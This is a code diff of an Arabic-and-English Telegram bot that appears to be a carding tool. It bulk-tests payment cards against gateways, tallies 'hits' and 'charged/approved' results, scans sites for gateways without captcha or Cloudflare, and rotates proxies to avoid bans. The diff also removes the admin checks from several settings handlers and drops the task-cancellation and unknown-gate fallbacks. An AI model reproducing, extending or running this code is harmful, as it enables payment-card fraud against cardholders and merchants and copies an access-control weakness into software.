-            "`ip:port:user:pass` ✅\n"
             "`user:pass@host:port`\n"
-            "`http://user:pass@host:port`\n"
-            "`https://user:pass@host:port`",
+            "`host:port:user:pass` ← BrightData\n"
+            "`https://user:pass@host:port`\n"
+            "`socks5://user:pass@host:port`",
             parse_mode="Markdown"
         )
         admin_session[user_id] = 'authenticated'
@@ -1990,41 +1728,35 @@ def admin_proxy_input(message):
     if rotating and not regular:
         for p in rotating:
             proxy_pool.add_proxy(p)
+        a, b, d = proxy_pool.get_stats()
         bot.send_message(
             user_id,
-            f"⚡ Added *{len(rotating)}* authenticated proxies instantly.",
+            f"⚡ *Added {len(rotating)} proxies instantly*\n\n"
+            f"📡 Pool now: 🟢{a} active  🟡{b} banned  🔴{d} dead\n"
+            f"Sample: `{rotating[0][:60]}`",
             parse_mode="Markdown"
         )
         admin_session[user_id] = 'authenticated'
         show_admin_menu(user_id)
         return
 
-    suffix = f" + {len(rotating)} authenticated (instant)" if rotating else ""
+    suffix = f" + {len(rotating)} rotating (instant)" if rotating else ""
     m = bot.send_message(
         user_id,
         f"🔍 Testing *{len(regular)}* plain proxies{suffix}...",
         parse_mode="Markdown"
     )
     def _check():
-        # proxies already normalized — pass directly
-        working_rot = []
-        for p in rotating:
-            proxy_pool.add_proxy(p)
-            working_rot.append(p)
-        working_reg = []
-        with ThreadPoolExecutor(max_workers=20) as ex:
-            futures = {ex.submit(check_proxy_accurate, p): p for p in regular}
-            for future in as_completed(futures):
-                res = future.result()
-                if res:
-                    working_reg.append(res)
-                    proxy_pool.add_proxy(res)
-        total_added = len(working_rot) + len(working_reg)
-        lines = [f"✅ Added *{total_added}* proxies:"]
-        if working_rot:
-            lines.append(f"  ⚡ {len(working_rot)} authenticated (instant)")
-        if working_reg is not None:
-            lines.append(f"  🔍 {len(working_reg)} of {len(regular)} plain (passed test)")
+        working = add_proxies_to_pool(proxies)
+        rot_cnt = len([w for w in working if is_rotating_proxy(w)])
+        reg_cnt = len(working) - rot_cnt
+        a, b, d = proxy_pool.get_stats()
+        lines = [f"✅ *Added {len(working)} proxies*"]
+        if rot_cnt:
+            lines.append(f"  ⚡ {rot_cnt} rotating (instant)")
+        if reg_cnt:
+            lines.append(f"  🔍 {reg_cnt}/{len(regular)} plain (passed test)")
+        lines.append(f"\n📡 Pool: 🟢{a}  🟡{b}  🔴{d}")
         bot.edit_message_text(
             "\n".join(lines), user_id, m.message_id, parse_mode="Markdown"
         )
@@ -2073,7 +1805,9 @@ def handle_doc(message):
         return
 
     if "proxy" in filename:
-        proxies = [p.strip() for p in content.splitlines() if p.strip() and ':' in p]
+        raw_p   = [p.strip() for p in content.splitlines() if p.strip() and ':' in p]
+        proxies = [normalize_proxy(p) for p in raw_p]
+        proxies = [p for p in proxies if p]
         if proxies:
             threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
             edit_banner(user_id, chat_id,
@@ -2089,10 +1823,9 @@ def handle_doc(message):
         if urls:
             user_session_state.pop(user_id, None)
             mid = user_main_message.get(user_id)
-            stop = start_user_task(user_id, "gate_scan")
             threading.Thread(
                 target=scan_gates_ui,
-                args=(urls, chat_id, user_id, mid, stop)
+                args=(urls, chat_id, user_id, mid)
             ).start()
         else:
             edit_banner(user_id, chat_id, "❌ File is empty or contains no URLs.", back_kb())
@@ -2104,10 +1837,9 @@ def handle_doc(message):
             user_session_state.pop(user_id, None)
             gate_id = user_gate_choice.get(user_id, '1')
             mid     = user_main_message.get(user_id)
-            stop = start_user_task(user_id, "bulk_check")
             threading.Thread(
                 target=check_bulk_ui,
-                args=(cards, chat_id, user_id, gate_id, mid, stop)
+                args=(cards, chat_id, user_id, gate_id, mid)
             ).start()
         else:
             edit_banner(user_id, chat_id, CARD_FORMAT_HELP, back_kb())
@@ -2151,10 +1883,9 @@ def handle_text(message):
             return
         user_session_state.pop(user_id, None)
         mid = user_main_message.get(user_id)
-        stop = start_user_task(user_id, "gate_scan")
         threading.Thread(
             target=scan_gates_ui,
-            args=(urls, chat_id, user_id, mid, stop)
+            args=(urls, chat_id, user_id, mid)
         ).start()
         return
 
@@ -2165,10 +1896,9 @@ def handle_text(message):
             user_session_state.pop(user_id, None)
             gate_id = user_gate_choice.get(user_id, '1')
             mid     = user_main_message.get(user_id)
-            stop = start_user_task(user_id, "single_check")
             threading.Thread(
                 target=check_single_ui,
-                args=(card, chat_id, user_id, gate_id, mid, stop)
+                args=(card, chat_id, user_id, gate_id, mid)
             ).start()
         else:
             edit_banner(user_id, chat_id, CARD_FORMAT_HELP, back_kb())
@@ -2181,17 +1911,20 @@ def handle_text(message):
             user_session_state.pop(user_id, None)
             gate_id = user_gate_choice.get(user_id, '1')
             mid     = user_main_message.get(user_id)
-            stop = start_user_task(user_id, "bulk_check")
             threading.Thread(
                 target=check_bulk_ui,
-                args=(cards, chat_id, user_id, gate_id, mid, stop)
+                args=(cards, chat_id, user_id, gate_id, mid)
             ).start()
         else:
             edit_banner(user_id, chat_id, CARD_FORMAT_HELP, back_kb())
         return
 
     # ─── افتراضي: القائمة الرئيسية ───
-    send_banner(chat_id, user_id, MAIN_CAPTION, main_menu_kb(user_id))
+    mid = user_main_message.get(user_id)
+    if mid:
+        edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id))
+    else:
+        send_banner(chat_id, user_id, MAIN_CAPTION, main_menu_kb(user_id))
 
 # ═══════════════════════════════════════
 # Callback: القائمة الرئيسية
@@ -2201,7 +1934,6 @@ def cb_main_menu(call):
     user_id = call.from_user.id
     chat_id = call.message.chat.id
     mid     = call.message.message_id
-    cancel_user_task(user_id)  # إيقاف أي مهمة جارية
     user_session_state.pop(user_id, None)
     user_main_message[user_id] = mid
     edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id), msg_id=mid)
@@ -2215,7 +1947,6 @@ def cb_menu_single(call):
     user_id = call.from_user.id
     chat_id = call.message.chat.id
     mid     = call.message.message_id
-    cancel_user_task(user_id)
     user_main_message[user_id] = mid
     bot.answer_callback_query(call.id)
 
@@ -2238,7 +1969,6 @@ def cb_menu_bulk(call):
     user_id = call.from_user.id
     chat_id = call.message.chat.id
     mid     = call.message.message_id
-    cancel_user_task(user_id)
     user_main_message[user_id] = mid
     bot.answer_callback_query(call.id)
 
@@ -2327,11 +2057,7 @@ def cb_gate(call):
     mode    = parts[2] if len(parts) > 2 else 'single'
 
     user_gate_choice[user_id] = gate_id
-    gate = GATES.get(gate_id)
-    if not gate:
-        gate_name = "Unknown Gate"
-    else:
-        gate_name = gate['name']
+    gate_name = GATES[gate_id]['name']
 
     if mode == 'single':
         user_session_state[user_id] = 'awaiting_single_card'
@@ -2364,14 +2090,9 @@ def cb_gate(call):
 # ═══════════════════════════════════════
 # فحص كارت واحد (thread)
 # ═══════════════════════════════════════
-def check_single_ui(card_str, chat_id, user_id, gate_id, msg_id, stop_event=None):
-    gate = GATES.get(gate_id)
-    if not gate:
-        gate_name = "Unknown Gate"
-        is_cw = False
-    else:
-        gate_name = gate['name']
-        is_cw = gate.get('type') == 'cw'
+def check_single_ui(card_str, chat_id, user_id, gate_id, msg_id):
+    gate_name = GATES[gate_id]['name']
+    is_cw = GATES[gate_id].get('type') == 'cw'
 
     frames = ["⏳", "⌛"]
     for i in range(3):
@@ -2391,17 +2112,9 @@ def check_single_ui(card_str, chat_id, user_id, gate_id, msg_id, stop_event=None
             pass
         time.sleep(0.6)
 
-    if stop_event and stop_event.is_set():
-        finish_user_task(user_id)
-        edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id), msg_id=msg_id)
-        return
     status, reason = _check_one_card(card_str, gate_id)
     bin6    = card_str.split('|')[0][:6]
-    bin_inf = get_bin_info(bin6) or {
-        "brand": "?", "type": "?", "bank": "?",
-        "country": "?", "flag": "🌍"
-    }
-    finish_user_task(user_id)
+    bin_inf = get_bin_info(bin6)
 
     # Return banner to main menu first
     try:
@@ -2436,98 +2149,55 @@ def check_single_ui(card_str, chat_id, user_id, gate_id, msg_id, stop_event=None
 # ═══════════════════════════════════════
 # فحص مجموعة كروت (thread) مع Progress Bar
 # ═══════════════════════════════════════
-def check_bulk_ui(cards, chat_id, user_id, gate_id, msg_id, stop_event=None):
+def check_bulk_ui(cards, chat_id, user_id, gate_id, msg_id):
     total     = len(cards)
-    gate = GATES.get(gate_id)
-    if not gate:
-        gate_name = "Unknown Gate"
-        is_cw = False
-    else:
-        gate_name = gate['name']
-        is_cw = gate.get('type') == 'cw'
+    gate_name = GATES[gate_id]['name']
+    is_cw     = GATES[gate_id].get('type') == 'cw'
     send_mode = get_setting('send_mode', 'all')  # 'all' or 'hits_only'
 
-    # ─── counters (protected by lock) ───────────────────────────────────────
     res  = {'hits': 0, 'declined': 0, 'error': 0, 'done': 0}
     lock = threading.Lock()
-    result_log = []
+    last_edit  = [0.0]
+    result_log = []   # for export
 
-    # ─── progress thread ─────────────────────────────────────────────────────
-    # يشتغل في thread منفصل ويعمل edit كل 3 ثواني تلقائياً بغض النظر عن الـ workers
-    progress_stop = threading.Event()
+    def push_progress():
+        now = time.time()
+        with lock:
+            if now - last_edit[0] < 2.5 and res['done'] < total:
+                return
+            last_edit[0] = now
+            done = res['done']
+            snap = dict(res)
 
-    _bulk_stop_kb = types.InlineKeyboardMarkup()
-    _bulk_stop_kb.add(btn("🛑 إيقاف الفحص", STYLE_DANGER, callback_data="task_cancel"))
-
-    def _progress_loop():
-        while not progress_stop.is_set():
-            with lock:
-                done = res['done']
-                snap = dict(res)
-            bar = progress_bar(done, total)
-            cap = (
-                f"🔄 *Checking...*\n\n"
-                f"🏦 Gateway: {gate_name}\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"`{bar}`\n"
-                f"📈 *{done} / {total}* cards\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"✅ Hits: *{snap['hits']}*  |  "
-                f"❌ Declined: *{snap['declined']}*  |  "
-                f"⚠️ Error: *{snap['error']}*"
-            )
-            try:
-                bot.edit_message_caption(
-                    caption=cap, chat_id=chat_id, message_id=msg_id,
-                    reply_markup=_bulk_stop_kb,
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
-            # انتظر 3 ثواني مقسمة لـ 0.5 ثانية علشان يستجيب للإيقاف بسرعة
-            for _ in range(6):
-                if progress_stop.is_set():
-                    break
-                time.sleep(0.5)
-
-    # بعت أول progress فوراً قبل ما يبدأ الـ thread
-    try:
-        bot.edit_message_caption(
-            caption=(
-                f"🔄 *Checking...*\n\n"
-                f"🏦 Gateway: {gate_name}\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"`{'░' * 14}   0%`\n"
-                f"📈 *0 / {total}* cards\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"✅ Hits: *0*  |  ❌ Declined: *0*  |  ⚠️ Error: *0*"
-            ),
-            chat_id=chat_id, message_id=msg_id,
-            reply_markup=_bulk_stop_kb,
-            parse_mode="Markdown"
+        bar = progress_bar(done, total)
+        cap = (
+            f"🔄 *Checking...*\n\n"
+            f"🏦 Gateway: {gate_name}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"`{bar}`\n"
+            f"📈 *{done} / {total}* cards\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"✅ Hits: *{snap['hits']}*  |  "
+            f"❌ Declined: *{snap['declined']}*  |  "
+            f"⚠️ Error: *{snap['error']}*"
         )
-    except Exception:
-        pass
+        try:
+            bot.edit_message_caption(
+                caption=cap, chat_id=chat_id, message_id=msg_id,
+                reply_markup=types.InlineKeyboardMarkup(),
+                parse_mode="Markdown"
+            )
+        except:
+            pass
 
-    progress_thread = threading.Thread(target=_progress_loop, daemon=True)
-    progress_thread.start()
+    push_progress()
 
-    # ─── worker ──────────────────────────────────────────────────────────────
     def process_one(card):
-        if stop_event and stop_event.is_set():
-            with lock:
-                res['done'] += 1
-            return "CANCELLED"
-
         status, reason = _check_one_card(card, gate_id)
         bin6    = card.split('|')[0][:6]
-        bin_inf = get_bin_info(bin6) or {
-            "brand": "?", "type": "?", "bank": "?",
-            "country": "?", "flag": "🌍"
-        }
+        bin_inf = get_bin_info(bin6)
         is_hit  = _is_hit(status, gate_id)
 
-        # تحديث العدادات بسرعة (بدون أي I/O جوه الـ lock)
         with lock:
             if is_hit:
                 res['hits'] += 1
@@ -2536,15 +2206,14 @@ def check_bulk_ui(cards, chat_id, user_id, gate_id, msg_id, stop_event=None):
             else:
                 res['error'] += 1
             res['done'] += 1
-            result_log.append(f"[{status}] {card} | {reason}")
+            icon, label = STATUS_LABEL.get(status, ("⚠️", status))
+            result_log.append(
+                f"[{status}] {card} | {reason}"
+            )
+        push_progress()
 
-        # بعت النتيجة للمحادثة (خارج الـ lock)
-        # CW gate: اعرض كل النتايج — hits + declined + errors
-        # باقي البوابات: حسب send_mode
-        if is_cw:
-            should_send = True                               # ← كل نتيجة تتعرض
-        else:
-            should_send = is_hit or (send_mode == 'all')    # all = hits+declined
+        # Decide whether to send this result live
+        should_send = is_hit or (send_mode == 'all' and status == 'DECLINED')
         if not should_send:
             return status
 
@@ -2580,36 +2249,14 @@ def check_bulk_ui(cards, chat_id, user_id, gate_id, msg_id, stop_event=None):
                     res['error'] += 1
                     res['done']  += 1
 
-    # أوقف الـ progress thread
-    progress_stop.set()
-    progress_thread.join(timeout=4)
-
     # Store results for export
     user_bulk_results[user_id] = list(result_log)
-    finish_user_task(user_id)
 
-    was_stopped = bool(stop_event and stop_event.is_set())
-
-    # رجّع البانر للقائمة الرئيسية
+    # Return banner to main menu
     try:
         edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id), msg_id=msg_id)
-    except Exception:
+    except:
         pass
-
-    # ─ تم الإيقاف ─
-    if was_stopped:
-        try:
-            bot.send_message(
-                chat_id,
-                f"🛑 *تم إيقاف الفحص*\n\n"
-                f"📦 تم فحص: *{res['done']}* / *{total}*\n"
-                f"✅ Hits: *{res['hits']}*  |  ❌ Declined: *{res['declined']}*  |  ⚠️ Error: *{res['error']}*",
-                parse_mode="Markdown",
-                reply_markup=after_bulk_kb(bool(result_log))
-            )
-        except Exception as e:
-            logger.error(f"bulk cancel summary error: {e}")
-        return
 
     # Summary message
     cap = (
@@ -2638,7 +2285,6 @@ def cb_menu_gate_scan(call):
     user_id = call.from_user.id
     chat_id = call.message.chat.id
     mid     = call.message.message_id
-    cancel_user_task(user_id)
     user_main_message[user_id] = mid
     bot.answer_callback_query(call.id)
 
@@ -2666,49 +2312,44 @@ def cb_menu_gate_scan(call):
     )
 
 
-def scan_gates_ui(urls, chat_id, user_id, msg_id, stop_event=None):
+def scan_gates_ui(urls, chat_id, user_id, msg_id):
     """يفحص قائمة URLs ويرسل النتائج مع شريط تقدم"""
-    total = len(urls)
-    res   = {'found': 0, 'no_gate': 0, 'secured': 0, 'failed': 0, 'done': 0}
-    lock  = threading.Lock()
+    total     = len(urls)
+    res       = {'found': 0, 'no_gate': 0, 'secured': 0, 'failed': 0, 'done': 0}
+    lock      = threading.Lock()
+    last_edit = [0.0]
 
-    _scan_stop_kb = types.InlineKeyboardMarkup()
-    _scan_stop_kb.add(btn("🛑 إيقاف الفحص", STYLE_DANGER, callback_data="task_cancel"))
+    def push_progress():
+        now = time.time()
+        with lock:
+            if now - last_edit[0] < 2.5 and res['done'] < total:
+                return
+            last_edit[0] = now
+            done = res['done']
+            snap = dict(res)
 
-    # ─── progress thread ─────────────────────────────────────────────────────
-    progress_stop = threading.Event()
-
-    def _progress_loop():
-        while not progress_stop.is_set():
-            with lock:
-                done = res['done']
-                snap = dict(res)
-            bar = progress_bar(done, total)
-            cap = (
-                f"🔍 *Scanning Sites...*\n\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"`{bar}`\n"
-                f"📈 *{done} / {total}* sites\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"✅ Unprotected gateway: *{snap['found']}*\n"
-                f"🛡️ Protected (Captcha/CF): *{snap['secured']}*\n"
-                f"❌ No payment gateway: *{snap['no_gate']}*\n"
-                f"⚠️ Fetch failed: *{snap['failed']}*"
+        bar = progress_bar(done, total)
+        cap = (
+            f"🔍 *Scanning Sites...*\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"`{bar}`\n"
+            f"📈 *{done} / {total}* sites\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"✅ Unprotected gateway: *{snap['found']}*\n"
+            f"🛡️ Protected (Captcha/CF): *{snap['secured']}*\n"
+            f"❌ No payment gateway: *{snap['no_gate']}*\n"
+            f"⚠️ Fetch failed: *{snap['failed']}*"
+        )
+        try:
+            bot.edit_message_caption(
+                caption=cap, chat_id=chat_id, message_id=msg_id,
+                reply_markup=types.InlineKeyboardMarkup(),
+                parse_mode="Markdown"
             )
-            try:
-                bot.edit_message_caption(
-                    caption=cap, chat_id=chat_id, message_id=msg_id,
-                    reply_markup=_scan_stop_kb,
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
-            for _ in range(6):
-                if progress_stop.is_set():
-                    break
-                time.sleep(0.5)
+        except:
+            pass
 
-    # أول رسالة فورية
+    # Initial message
     try:
         bot.edit_message_caption(
             caption=(
@@ -2717,21 +2358,13 @@ def scan_gates_ui(urls, chat_id, user_id, msg_id, stop_event=None):
                 f"⏳ Please wait..."
             ),
             chat_id=chat_id, message_id=msg_id,
-            reply_markup=_scan_stop_kb,
+            reply_markup=types.InlineKeyboardMarkup(),
             parse_mode="Markdown"
         )
-    except Exception:
+    except:
         pass
 
-    progress_thread = threading.Thread(target=_progress_loop, daemon=True)
-    progress_thread.start()
-
-    # ─── worker ──────────────────────────────────────────────────────────────
     def process_url(url):
-        if stop_event and stop_event.is_set():
-            with lock:
-                res['done'] += 1
-            return
         result, code = scan_single_url(url)
         with lock:
             if result is None:
@@ -2744,8 +2377,9 @@ def scan_gates_ui(urls, chat_id, user_id, msg_id, stop_event=None):
             else:
                 res['found'] += 1
             res['done'] += 1
+        push_progress()
 
-        # بعت النتيجة خارج الـ lock
+        # ✅ Unprotected site with gateway
         if result and not result['captcha'] and not result['cloudflare']:
             gates_str = md_escape(', '.join(result['gateways'][:6]))
             try:
@@ -2760,8 +2394,10 @@ def scan_gates_ui(urls, chat_id, user_id, msg_id, stop_event=None):
                     f"Check by ➜ 𝓑𝓜〆𝓥𝓞𝓡𝓣𝓔𝓧",
                     parse_mode="Markdown"
                 )
-            except Exception:
+            except:
                 pass
+
+        # 🛡️ Protected site
         elif result and (result['captcha'] or result['cloudflare']):
             sec_str   = ' + '.join(result['security'])
             gates_str = md_escape(', '.join(result['gateways'][:3]))
@@ -2772,9 +2408,10 @@ def scan_gates_ui(urls, chat_id, user_id, msg_id, stop_event=None):
                     f"💳 _{gates_str}_ | 🔒 {sec_str}",
                     parse_mode="Markdown"
                 )
-            except Exception:
+            except:
                 pass
 
+    # تشغيل متوازي
     max_w = min(5, (os.cpu_count() or 2) + 2)
     with ThreadPoolExecutor(max_workers=max_w) as ex:
         futures = {ex.submit(process_url, url): url for url in urls}
@@ -2787,30 +2424,13 @@ def scan_gates_ui(urls, chat_id, user_id, msg_id, stop_event=None):
                     res['failed'] += 1
                     res['done']   += 1
 
-    progress_stop.set()
-    progress_thread.join(timeout=4)
-    finish_user_task(user_id)
-
-    was_stopped = bool(stop_event and stop_event.is_set())
-
+    # Return banner to main menu
     try:
         edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id), msg_id=msg_id)
-    except Exception:
+    except:
         pass
 
-    if was_stopped:
-        try:
-            bot.send_message(
-                chat_id,
-                f"🛑 *تم إيقاف الفحص*\n"
-                f"✅ غير محمي: *{res['found']}* | 🛡️ محمي: *{res['secured']}*\n"
-                f"📦 تم فحص: *{res['done']}* / *{total}*",
-                parse_mode="Markdown"
-            )
-        except Exception:
-            pass
-        return
-
+    # Final summary
     summary = (
         f"🏁 *Gate Scan Complete!*\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -2833,12 +2453,7 @@ def scan_gates_ui(urls, chat_id, user_id, msg_id, stop_event=None):
 # ═══════════════════════════════════════
 @bot.callback_query_handler(func=lambda c: c.data == "menu_settings")
 def cb_menu_settings(call):
-    # Settings is now accessed from the Admin Panel only — this route is kept
-    # as a safety net but always requires admin + authenticated session.
     user_id = call.from_user.id
-    if user_id != ADMIN_ID or admin_session.get(user_id) != 'authenticated':
-        bot.answer_callback_query(call.id, "⛔ الإعدادات متاحة للأدمن فقط.", show_alert=True)
-        return
     chat_id = call.message.chat.id
     mid     = call.message.message_id
     user_main_message[user_id] = mid
@@ -2886,9 +2501,6 @@ def _show_settings(user_id, chat_id, mid):
 @bot.callback_query_handler(func=lambda c: c.data.startswith("setting_threads_"))
 def cb_setting_threads(call):
     user_id = call.from_user.id
-    if user_id != ADMIN_ID or admin_session.get(user_id) != 'authenticated':
-        bot.answer_callback_query(call.id, "⛔ Admin only.", show_alert=True)
-        return
     chat_id = call.message.chat.id
     mid     = call.message.message_id
     n = call.data.split("setting_threads_")[1]
@@ -2899,9 +2511,6 @@ def cb_setting_threads(call):
 @bot.callback_query_handler(func=lambda c: c.data.startswith("setting_sendmode_"))
 def cb_setting_sendmode(call):
     user_id = call.from_user.id
-    if user_id != ADMIN_ID or admin_session.get(user_id) != 'authenticated':
-        bot.answer_callback_query(call.id, "⛔ Admin only.", show_alert=True)
-        return
     chat_id = call.message.chat.id
     mid     = call.message.message_id
     new_mode = call.data.split("setting_sendmode_")[1]
@@ -2921,8 +2530,8 @@ def cb_setting_proxy_info(call):
 @bot.callback_query_handler(func=lambda c: c.data == "setting_add_proxy")
 def cb_setting_add_proxy(call):
     user_id = call.from_user.id
-    if user_id != ADMIN_ID or admin_session.get(user_id) != 'authenticated':
-        bot.answer_callback_query(call.id, "⛔ Admin only.", show_alert=True)
+    if user_id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "⛔ Admin only.")
         return
     bot.answer_callback_query(call.id)
     bot.send_message(
@@ -2938,15 +2547,6 @@ def cb_setting_add_proxy(call):
     )
     admin_session[user_id] = 'awaiting_proxy_input'
 
-
-# ═══════════════════════════════════════
-# Callback: إيقاف المهمة الجارية
-# ═══════════════════════════════════════
-@bot.callback_query_handler(func=lambda c: c.data == "task_cancel")
-def cb_task_cancel(call):
-    user_id = call.from_user.id
-    cancel_user_task(user_id)
-    bot.answer_callback_query(call.id, "🛑 تم إرسال أمر الإيقاف...", show_alert=False)
 
 # ═══════════════════════════════════════
 # Callback: Export Results
@@ -3020,9 +2620,6 @@ def show_admin_menu(user_id):
     )
     kb.add(
         btn("🔍 تشخيص البوابات",  STYLE_PRIMARY, callback_data="admin_test_gates"),
-        btn("⚙️ الإعدادات",        STYLE_PRIMARY, callback_data="admin_open_settings"),
-    )
-    kb.add(
         btn("❌ خروج",            STYLE_DANGER,  callback_data="admin_logout"),
     )
     bot.send_message(
@@ -3041,45 +2638,7 @@ def cb_admin(call):
     data = call.data
     bot.answer_callback_query(call.id)
 
-    if data == "admin_open_settings":
-        # Settings now lives inside admin panel — needs authenticated session
-        # We reuse the same _show_settings UI but send as new message (not banner)
-        send_mode   = get_setting('send_mode',    'all')
-        threads     = int(get_setting('bulk_threads', '5'))
-        mode_label  = "📨 All Results" if send_mode == 'all' else "🎯 Hits Only"
-        mode_next   = 'hits_only'       if send_mode == 'all' else 'all'
-        thread_cycle = {3: 5, 5: 10, 10: 3}
-        next_threads = thread_cycle.get(threads, 5)
-        a, b, d = proxy_pool.get_stats()
-        cached  = len(_bin_cache)
-        kb2 = types.InlineKeyboardMarkup(row_width=1)
-        kb2.add(btn(f"📤 Send Mode: {mode_label}  (tap to toggle)",
-                    STYLE_PRIMARY, callback_data=f"setting_sendmode_{mode_next}"))
-        kb2.add(btn(f"⚡ Threads: {threads}  (tap to cycle: {next_threads} next)",
-                    STYLE_PRIMARY, callback_data=f"setting_threads_{next_threads}"))
-        kb2.add(btn(f"📡 Proxies — 🟢{a} 🟡{b} 🔴{d}",
-                    STYLE_PRIMARY, callback_data="setting_proxy_info"))
-        kb2.add(btn("➕ Add Proxies",          STYLE_SUCCESS, callback_data="setting_add_proxy"))
-        kb2.add(btn("📡 Fetch from GitHub",    STYLE_SUCCESS, callback_data="admin_fetch_proxies"))
-        kb2.add(btn("🔙 رجوع للوحة الإدارة",  STYLE_DANGER,  callback_data="admin_back"))
-        cap = (
-            "⚙️ *Settings*\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📤 *Send Mode:* `{send_mode}`\n"
-            f"  • `all`        → Hits + Declined live\n"
-            f"  • `hits_only`  → Charged / Approved only\n\n"
-            f"⚡ *Bulk Threads:* `{threads}`  (3 / 5 / 10)\n"
-            f"  Higher = faster bulk, but more API load\n\n"
-            f"📡 *Proxies:* 🟢{a}  🟡{b}  🔴{d}\n"
-            f"🔢 *BIN Cache:* {cached} entries\n"
-            "━━━━━━━━━━━━━━━━━━━━━━"
-        )
-        bot.send_message(user_id, cap, reply_markup=kb2, parse_mode="Markdown")
-
-    elif data == "admin_back":
-        show_admin_menu(user_id)
-
-    elif data == "admin_create_code":
+    if data == "admin_create_code":
         bot.send_message(user_id, "📅 أرسل عدد الأيام (رقم فقط):")
         admin_session[user_id] = 'awaiting_days'
 
@@ -3091,7 +2650,7 @@ def cb_admin(call):
         msg = "📜 *قائمة الأكواد:*\n\n"
         for code, days, used_by, _, _ in codes[:30]:
             st = "✅ مستخدم" if used_by else "🟢 متاح"
-            msg += f"`{code}` | {days}d | {st}\n"
+            msg += f"`{code}` | {days}y | {st}\n"
         if len(codes) > 30:
             msg += f"\n... و {len(codes)-30} أخرى"
         bot.send_message(user_id, msg, parse_mode="Markdown")
@@ -3119,8 +2678,8 @@ def cb_admin(call):
         admin_session[user_id] = 'awaiting_revoke'
 
     elif data == "admin_fetch_proxies":
-        stop = start_user_task(user_id, "fetch_proxies")
-        threading.Thread(target=_fetch_and_add, args=(user_id, stop)).start()
+        bot.send_message(user_id, "📡 Fetching proxies from GitHub...")
+        threading.Thread(target=_fetch_and_add, args=(user_id,)).start()
 
     elif data == "admin_add_proxy":
         bot.send_message(
@@ -3153,92 +2712,13 @@ def cb_admin(call):
         admin_session.pop(user_id, None)
         bot.send_message(user_id, "👋 تم تسجيل الخروج من لوحة الإدارة.")
 
-def _fetch_and_add(user_id, stop_event=None):
-    """جلب البروكسيات مع شريط تقدم وزر إيقاف"""
-    _stop_kb = types.InlineKeyboardMarkup()
-    _stop_kb.add(btn("🛑 إيقاف الجلب", STYLE_DANGER, callback_data="task_cancel"))
-
-    pm = bot.send_message(
-        user_id,
-        "📡 *جارى جلب البروكسيات من GitHub...*\n⏳ يرجى الانتظار...",
-        parse_mode="Markdown", reply_markup=_stop_kb
-    )
-    pmid = pm.message_id
-
-    def _edit(text):
-        try:
-            bot.edit_message_text(text, user_id, pmid,
-                                  parse_mode="Markdown", reply_markup=None)
-        except Exception:
-            pass
-
-    try:
-        proxies = fetch_proxies_from_github()
-    except Exception as e:
-        _edit(f"❌ خطأ فى الجلب: {e}")
-        finish_user_task(user_id)
-        return
-
-    if stop_event and stop_event.is_set():
-        _edit("🛑 *تم الإيقاف — لم يُضَف شيء.*")
-        finish_user_task(user_id)
-        return
-
-    if not proxies:
-        _edit("❌ فشل جلب البروكسيات من GitHub.")
-        finish_user_task(user_id)
-        return
-
-    rotating = [p for p in proxies if is_rotating_proxy(p)]
-    regular  = [p for p in proxies if not is_rotating_proxy(p)]
-    working  = list(rotating)
-    for p in rotating:
-        proxy_pool.add_proxy(p)
-
-    tested  = [0]
-    lck2    = threading.Lock()
-
-    def _test_one(p):
-        if stop_event and stop_event.is_set():
-            return
-        result = check_proxy_accurate(p)
-        with lck2:
-            tested[0] += 1
-            if result:
-                working.append(result)
-                proxy_pool.add_proxy(result)
-            if tested[0] % 25 == 0 or tested[0] == len(regular):
-                pct  = int(100 * tested[0] / max(len(regular), 1))
-                bar  = "█" * (pct // 10) + "░" * (10 - pct // 10)
-                try:
-                    bot.edit_message_text(
-                        f"📡 *اختبار البروكسيات...*\n"
-                        f"`{bar}` {pct}%\n"
-                        f"✅ يعمل: *{len(working)}* | 🔄 تم: *{tested[0]}/{len(regular)}*",
-                        user_id, pmid, parse_mode="Markdown", reply_markup=_stop_kb
-                    )
-                except Exception:
-                    pass
-
-    if regular:
-        with ThreadPoolExecutor(max_workers=20) as ex2:
-            futs = {ex2.submit(_test_one, p): p for p in regular}
-            for fut in as_completed(futs):
-                if stop_event and stop_event.is_set():
-                    break
-                try: fut.result()
-                except Exception: pass
-
-    if stop_event and stop_event.is_set():
-        _edit(f"🛑 *تم الإيقاف.*\n✅ أُضيف: *{len(working)}* بروكسي")
+def _fetch_and_add(user_id):
+    proxies = fetch_proxies_from_github()
+    if proxies:
+        working = add_proxies_to_pool(proxies)
+        bot.send_message(user_id, f"✅ Added {len(working)} working proxies from GitHub.")
     else:
-        with open(PROXY_TXT, "w") as f:
-            f.write("\n".join(working))
-        _edit(
-            f"✅ *اكتمل الجلب!*\n"
-            f"📦 تم فحص: *{len(proxies)}* | ✅ يعمل: *{len(working)}*"
-        )
-    finish_user_task(user_id)
+        bot.send_message(user_id, "❌ Failed to fetch proxies.")
 
 # ═══════════════════════════════════════
 # تشغيل البوت
@@ -3297,18 +2777,9 @@ if __name__ == '__main__':
     print("Starting bot in Polling mode...")
     sys.stdout.flush()
     try:
-        print("Deleting webhook...")
-        sys.stdout.flush()
-        bot.delete_webhook()
-        time.sleep(2)
         bot.remove_webhook()
-        time.sleep(1)
-        print("Webhook deleted successfully")
-        sys.stdout.flush()
     except Exception as e:
